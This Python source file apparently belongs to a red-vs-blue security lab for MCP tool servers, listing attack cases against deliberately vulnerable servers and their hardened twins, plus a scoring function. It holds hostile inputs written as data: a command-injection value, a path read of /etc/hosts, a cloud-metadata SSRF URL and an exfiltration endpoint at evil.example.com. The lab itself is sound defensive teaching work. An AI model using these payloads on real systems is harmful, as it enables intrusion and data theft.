"""The Attack/Defend arena catalog — the red-vs-blue pairings.

Each :class:`ArenaCase` maps an attack to its vulnerable server, the hardened
twin, the tool to call, and the payloads. :func:`judge` then reads a tool result
and decides whether the guardrail held — the heuristic is deliberately explicit
(refusal phrases + an attack-success "proof" string) so the verdict is honest and
OS-independent rather than a black box.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

from ..config import REPO_ROOT

ATTACKS = REPO_ROOT / "attacks"
HARDENED = REPO_ROOT / "defense" / "hardened_servers"

# Must match attacks/_lab/safety.py — the lab's intentional opt-in friction. The
# arena only injects this into a vulnerable server's env after the user explicitly
# arms the lab in the UI, preserving the "never start vulnerable code by accident"
# guarantee.
LAB_ENV_VAR = "PURPLEMCP_LAB_ENABLED"
LAB_TOKEN = "i-understand-this-is-a-lab"


@dataclass(frozen=True)
class ArenaCase:
    id: str
    num: str
    title: str
    threat: str
    tool: str
    attack_args: dict
    vuln_path: Path
    hardened_path: Path
    guardrail: str
    explain: str
    proof: str = ""               # signature that the attack SUCCEEDED
    benign_args: dict | None = None  # optional "normal use" call
    needs_network: bool = False


CASES: list[ArenaCase] = [
    ArenaCase(
        id="command-injection",
        num="03",
        title="Command Injection",
        threat="A diagnostics tool shells out, so attacker metacharacters run as commands.",
        tool="ping",
        benign_args={"host": "127.0.0.1"},
        # The $((6*7)) only evaluates to 42 if a shell actually runs it, so the
        # proof string "PWNED-42" can never appear from the literal echoed back.
        attack_args={"host": "127.0.0.1; echo PWNED-$((6*7))"},
        proof="PWNED-42",
        vuln_path=ATTACKS / "03_command_injection" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_nettools.py",
        guardrail="guardrails.exec.safe_run — argv list, no shell, executable allowlist",
        explain="The vulnerable ping runs your input through a shell, so `; echo …` executes "
                "and $((6*7)) expands to 42. The hardened twin passes the host as one literal "
                "argv element, so the metacharacters are inert text and ping just can't "
                "resolve the 'host'.",
    ),
    ArenaCase(
        id="path-traversal",
        num="04",
        title="Path Traversal",
        threat="A file reader trusts its path, so `/etc/hosts` escapes the docs root.",
        tool="read_doc",
        benign_args={"path": "welcome.txt"},
        attack_args={"path": "/etc/hosts"},
        proof="localhost",
        vuln_path=ATTACKS / "04_path_traversal" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_docreader.py",
        guardrail="guardrails.paths.safe_resolve — canonicalize + confine to root",
        explain="An absolute path makes os.path.join ignore the intended root entirely. "
                "safe_resolve canonicalizes the path and rejects anything that lands "
                "outside the docs root — so the read is refused.",
    ),
    ArenaCase(
        id="ssrf",
        num="05",
        title="Server-Side Request Forgery",
        threat="A fetch tool will hit internal-only addresses like cloud metadata.",
        tool="fetch",
        benign_args={"url": "https://example.com"},
        attack_args={"url": "http://169.254.169.254/latest/meta-data/"},
        vuln_path=ATTACKS / "05_ssrf" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_fetcher.py",
        guardrail="guardrails.net.safe_get — scheme allowlist, blocks private/link-local IPs",
        explain="169.254.169.254 is the cloud metadata endpoint — reachable from the server, "
                "not the internet. The vulnerable fetch tries it; safe_get refuses link-local "
                "and private hosts outright.",
        needs_network=True,
    ),
    ArenaCase(
        id="token-theft",
        num="06",
        title="Token Theft / Confused Deputy",
        threat="A diagnostics tool dumps the secret API token straight into its output.",
        tool="get_debug_info",
        attack_args={},
        proof="sk-fake-DO-NOT-USE",
        vuln_path=ATTACKS / "06_token_theft" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_crm.py",
        guardrail="guardrails.secrets.scrub — strip secret shapes from tool output",
        explain="The vulnerable diagnostics tool prints `api_token=sk-fake-…` for anyone "
                "to read. The hardened twin runs scrub() over its output first, so the "
                "secret comes back as [REDACTED:…].",
    ),
    ArenaCase(
        id="data-exfiltration",
        num="09",
        title="Data Exfiltration",
        threat="A backup tool will POST your notes to any endpoint a caller names.",
        tool="backup_note",
        benign_args={"content": "Q3 board notes — internal only."},
        attack_args={
            "content": "Q3 board notes — internal only.",
            "endpoint": "https://evil.example.com/collect",
        },
        vuln_path=ATTACKS / "09_data_exfiltration" / "vulnerable_server.py",
        hardened_path=HARDENED / "safe_backup.py",
        guardrail="endpoint allowlist + guardrails.secrets.scrub + human approval",
        explain="The vulnerable backup sends raw content to whatever endpoint it's handed — "
                "a ready-made exfil channel. The hardened twin only sends to an allowlisted "
                "host and scrubs secrets first, so 'back up to evil.com' is refused.",
        needs_network=True,
    ),
]

CASES_BY_ID = {c.id: c for c in CASES}

# Phrases that signal a guardrail engaged (refused / neutralized the input).
_DEFENDED = (
    "refused", "refuses", "blocked", "allowlist", "not in the", "not allowed",
    "pathtraversal", "ssrf", "commandnotallowed", "[redacted", "scrubbed",
    "cannot resolve", "unknown host", "name or service not known",
    "could not resolve", "name resolution",
)


@dataclass(frozen=True)
class Verdict:
    label: str
    kind: str  # "bad" (attacker wins) | "good" (defender wins) | "warn"
    leaked: bool
    defended: bool


def _signals(output: str, proof: str) -> tuple[bool, bool]:
    low = (output or "").lower()
    defended = any(phrase in low for phrase in _DEFENDED)
    leaked = bool(proof) and proof.lower() in low
    return leaked, defended


def judge(output: str, case: ArenaCase, *, hardened: bool) -> Verdict:
    """Decide what a tool result means for the attacker/defender."""
    leaked, defended = _signals(output, case.proof)
    if hardened:
        if defended and not leaked:
            return Verdict("BLOCKED", "good", leaked, defended)
        if leaked:
            return Verdict("LEAKED — regression!", "bad", leaked, defended)
        return Verdict("no guardrail hit", "warn", leaked, defended)
    # vulnerable side
    if leaked:
        return Verdict("EXPLOITED — data leaked", "bad", leaked, defended)
    if defended:
        return Verdict("held (unexpected)", "good", leaked, defended)
    return Verdict("EXPOSED — no guardrail", "bad", leaked, defended)
